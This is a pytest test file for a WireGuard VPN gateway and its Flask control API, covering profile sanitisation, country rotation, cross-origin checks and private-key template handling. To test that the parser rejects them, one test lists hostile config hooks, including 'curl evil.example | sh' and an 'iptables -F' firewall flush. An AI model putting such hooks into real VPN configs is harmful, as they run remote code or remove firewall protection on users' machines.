"""Offline WireGuard parser and API safeguards. No network, keys or Docker needed."""
import base64
import json

import pytest
import vpn_gateway as gateway
import vpn_ui


KEY_A = base64.b64encode(bytes([1]) * 32).decode()
KEY_B = base64.b64encode(bytes([2]) * 32).decode()
PROFILE = (
    "[Interface]\n"
    f"PrivateKey = {KEY_A}\n"
    "Address = 10.14.0.2/16\n"
    "DNS = 162.252.172.57\n"
    "[Peer]\n"
    f"PublicKey = {KEY_B}\n"
    "AllowedIPs = 0.0.0.0/0\n"
    "Endpoint = 203.0.113.11:51820\n"
)


def test_valid_surfshark_style_conf_is_sanitized():
    result = gateway.parse_profile(PROFILE)
    assert result["endpoint"] == "203.0.113.11"
    assert "Address = 10.14.0.2/16" in result["text"]
    assert "DNS =" not in result["text"]
    assert "PrivateKey =" in result["text"]
    assert "AllowedIPs = 0.0.0.0/0" in result["text"]


@pytest.mark.parametrize("replacement", [
    "PostUp = curl evil.example | sh",
    "PreDown = iptables -F",
    "SaveConfig = true",
    "Table = off",
])
def test_reject_hooks_and_route_bypass(replacement):
    content = PROFILE.replace("DNS = 162.252.172.57", replacement)
    with pytest.raises(ValueError):
        gateway.parse_profile(content)


def test_reject_split_tunnel_and_invalid_key():
    with pytest.raises(ValueError, match="Full-tunnel"):
        gateway.parse_profile(PROFILE.replace("0.0.0.0/0", "10.0.0.0/8"))
    with pytest.raises(ValueError, match="key"):
        gateway.parse_profile(PROFILE.replace(KEY_A, "not-a-key"))


def test_rotation_loop_records_each_verified_country_and_restores(monkeypatch, tmp_path):
    monkeypatch.setattr(gateway, "ROOT", tmp_path)
    monkeypatch.setattr(gateway, "ACTIVE_FILE", tmp_path / "wg0.conf")
    monkeypatch.setattr(gateway, "META_FILE", tmp_path / "profiles.json")
    gateway.TASK.update(running=True, done=False, results=[], message="")
    gateway.save_metadata({"profiles": [
        {"id": "a", "filename": "nl.conf", "country": "Netherlands"},
        {"id": "b", "filename": "de.conf", "country": "Germany"},
    ], "active": "a"})
    called = []

    def fake_activate(pid):
        called.append(pid)
        return {"ip": "198.51.100.10" if pid == "a" else "198.51.100.20",
                "country": "Netherlands" if pid == "a" else "Germany",
                "country_code": "NL" if pid == "a" else "DE"}
    monkeypatch.setattr(gateway, "_activate", fake_activate)
    gateway.test_worker()
    assert called == ["a", "b", "a"]
    assert gateway.TASK["done"] and not gateway.TASK["running"]
    assert len(gateway.TASK["results"]) == 2
    assert all(item["ok"] for item in gateway.TASK["results"])


def test_controller_disabled_has_no_side_effects(monkeypatch):
    monkeypatch.delenv("VPN_GATEWAY_ENABLED", raising=False)
    from flask import Flask
    from threading import Lock
    app = Flask(__name__)
    vpn_ui.register(app, {}, Lock())
    with app.test_client() as client:
        assert client.get("/api/vpn/profiles").status_code == 503


def test_controller_needs_no_user_token_but_rejects_cross_origin_actions(monkeypatch, tmp_path):
    monkeypatch.setenv("VPN_GATEWAY_ENABLED", "1")
    token = tmp_path / "control-token"
    token.write_text("secret-controlled-by-gateway-and-server-only-012345")
    monkeypatch.setenv("VPN_CONTROL_TOKEN_FILE", str(token))
    from flask import Flask
    from threading import Lock
    app = Flask(__name__)
    vpn_ui.register(app, {}, Lock())
    with app.test_client() as client:
        # The browser needs no administrator credentials. GET may return 503
        # when the actual gateway isn't running in the offline test.
        assert client.get("/api/vpn/profiles").status_code != 403
        assert client.post("/api/vpn/test").status_code == 403
        assert client.post("/api/vpn/test", headers={
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://other.example",
        }).status_code == 403
        assert client.post("/api/vpn/test", headers={
            "X-Requested-With": "XMLHttpRequest",
        }).status_code != 403


def test_gateway_control_token_is_generated_once_without_admin_setup(monkeypatch, tmp_path):
    import os
    monkeypatch.setenv("VPN_DOWNLOADER_UID", str(os.getuid()))
    monkeypatch.setenv("VPN_DOWNLOADER_GID", str(os.getgid()))
    location = tmp_path / "state" / ".vpn-control-token"
    monkeypatch.setattr(gateway, "TOKEN_FILE", location)
    gateway.ensure_control_token()
    first = location.read_text().strip()
    assert len(first) >= 32
    assert gateway.TOKEN == first
    assert location.stat().st_mode & 0o777 == 0o600
    gateway.ensure_control_token()
    assert location.read_text().strip() == first


def test_normal_compose_provides_gateway_without_env_or_overrides():
    from pathlib import Path
    root = Path(__file__).resolve().parents[1]
    compose = (root / "compose.yaml").read_text()
    assert "wireguard-gateway:" in compose
    assert 'network_mode: "service:wireguard-gateway"' in compose
    assert 'VPN_GATEWAY_ENABLED: "1"' in compose
    assert "SURFSHARK_CONTROL_API_KEY" not in compose
    assert "compose.wireguard.yaml" not in compose
    html = (root / "templates/index.html").read_text()
    assert "vpn-admin-key" not in html
    assert "vpn-country" not in html
    assert 'id="vpn-upload-input"' in html
    assert 'id="vpn-test-button"' in html


def test_shared_parent_compose_override_and_safe_installer():
    from pathlib import Path
    root = Path(__file__).resolve().parents[1]
    overlay = (root / "compose.parent-vpn.yaml").read_text()
    script = (root / "scripts/enable-vpn-ui.sh").read_text()
    assert "wireguard-gateway:" in overlay
    assert 'network_mode: "service:wireguard-gateway"' in overlay
    assert "ports: !reset []" in overlay
    assert "SURFSHARK_CONTROL_API_KEY" not in overlay
    assert 'VPN_GATEWAY_ENABLED: "1"' in overlay
    assert "docker-compose.override.yml" in script
    assert "ps -q yt-dlp-server" in script
    assert "api/jobs" in script
    assert "active_resolution_tracks" in script
    assert "docker compose" in script
    assert "stop yt-dlp-server" in script
    assert "up -d --build --force-recreate wireguard-gateway yt-dlp-server" in script
    assert "will not be overwritten" in script


def test_surfshark_template_requires_registered_client_private_key():
    from vpn_ui import MissingClientKey, complete_wireguard_template

    missing = PROFILE.replace(KEY_A, "<insert_your_private_key_here>")
    with pytest.raises(MissingClientKey, match="Surfshark"):
        complete_wireguard_template(missing)
    result = complete_wireguard_template(missing, KEY_A)
    assert "PrivateKey = " + KEY_A in result
    assert "<insert_your_private_key_here>" not in result
    assert gateway.parse_profile(result)["endpoint"] == "203.0.113.11"


def test_invalid_shared_key_error_does_not_echo_secret():
    from vpn_ui import complete_wireguard_template
    missing = PROFILE.replace(KEY_A, "<insert_your_private_key_here>")
    fake_key = "NOT-AN-ACTUAL-WIREGUARD-PRIVATE-KEY"
    with pytest.raises(ValueError) as exc:
        complete_wireguard_template(missing, fake_key)
    assert fake_key not in str(exc.value)
    # Already-complete profiles are unchanged and must never be overwritten.
    assert complete_wireguard_template(PROFILE, KEY_B) == PROFILE


def test_five_template_uploads_need_only_one_shared_key(monkeypatch):
    import io
    from flask import Flask
    from threading import Lock

    monkeypatch.setenv("VPN_GATEWAY_ENABLED", "1")
    app = Flask(__name__)
    vpn_ui.register(app, {}, Lock())
    calls = []

    def fake_gateway(path, payload=None):
        calls.append((path, payload))
        if path == "/profiles" and payload is not None:
            assert "PrivateKey = " + KEY_A in payload["content"]
            assert "<insert_your_private_key_here>" not in payload["content"]
            return {"id": str(len(calls)).zfill(32), "filename": payload["filename"],
                    "country": payload["country"]}, 200
        if path == "/profiles":
            return {"profiles": [], "active": "an-existing-profile"}, 200
        raise AssertionError("Unexpected VPN gateway call")

    monkeypatch.setattr(vpn_ui, "gateway_call", fake_gateway)
    templates = PROFILE.replace(KEY_A, "<insert_your_private_key_here>")
    names = ("us-nyc.conf", "nl-ams.conf", "de-fra.conf",
             "pt-lis.conf", "uk-lon.conf")

    def upload(client, supplied_key=None):
        files = [(io.BytesIO(templates.encode()), name) for name in names]
        data = {"configs": files}
        if supplied_key is not None:
            data["private_key"] = supplied_key
        return client.post("/api/vpn/profiles", data=data,
                           headers={"X-Requested-With": "XMLHttpRequest"},
                           content_type="multipart/form-data")

    with app.test_client() as client:
        no_key = upload(client)
        assert no_key.status_code == 422
        assert no_key.json["needs_private_key"] is True
        assert calls == []   # preflight refuses all five, no partial import

        with_key = upload(client, KEY_A)
        assert with_key.status_code == 200
        assert len(with_key.json["uploaded"]) == 5
        assert len(calls) == 6  # 5 uploads + status check
        assert KEY_A not in with_key.get_data(as_text=True)


def test_gateway_explains_missing_private_key_instead_of_generic_error():
    template = PROFILE.replace(KEY_A, "<insert_your_private_key_here>")
    with pytest.raises(ValueError, match="template"):
        gateway.parse_profile(template)
